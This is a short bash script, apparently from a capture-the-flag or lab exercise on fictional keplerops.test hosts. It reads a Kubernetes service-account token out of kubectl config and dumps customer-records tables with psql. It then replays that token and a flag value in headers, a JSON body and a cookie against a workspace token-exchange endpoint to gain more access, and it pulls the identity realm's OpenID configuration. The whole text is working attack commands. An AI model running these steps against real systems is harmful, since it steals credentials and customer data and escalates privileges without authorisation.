set +e
B=https://cloud-api.keplerops.test
WT='FLAG{6bb66074f2325405}'
JWT=$(kubectl config view --raw -o jsonpath='{.users[0].user.token}')
probe(){ label="$1"; shift; echo "=== $label"; curl -sSk -m 8 -w '\n[HTTP %{http_code}]\n' "$@" | head -30; }
echo "== pg access =="
psql service=fieldlink -c 'select * from support.customer_records' 2>&1 | head
psql service=fieldlink -c 'select * from support.customer_migration_history' 2>&1 | head
psql service=fieldlink -c 'select current_user, session_user, current_database()' 2>&1 | head
echo "== workspace exchange header probes =="
probe "WT X-Workspace-Token got" -H "X-Workspace-Token: $WT" "$B/api/workspaces/current/token-exchange"
probe "WT X-Workspace-Token post" -X POST -H "X-Workspace-Token: $WT" -H 'Content-Type: application/json' -d '{}' "$B/api/workspaces/current/token-exchange"
probe "JWT X-Kubernetes-Token" -H "X-Kubernetes-Token: $JWT" "$B/api/workspaces/current/token-exchange"
probe "JWT X-Workload-Token" -H "X-Workload-Token: $JWT" "$B/api/workspaces/current/token-exchange"
probe "JWT json bearer token field" -X POST -H 'Content-Type: application/json' -d "{\"workload_token\":\"$JWT\"}" "$B/api/workspaces/current/token-exchange"
probe "JWT cookie" -H "Cookie: workload_token=$JWT" "$B/api/workspaces/current/token-exchange"
echo "== identity realm =="
curl -sSk -m 10 'https://identity.keplerops.test/realms/keplerops/.well-known/openid-configuration' | head -c 3000; echo
curl -sSk -m 10 'https://identity.keplerops.test/realms/keplerops' | head -c 2000; echo
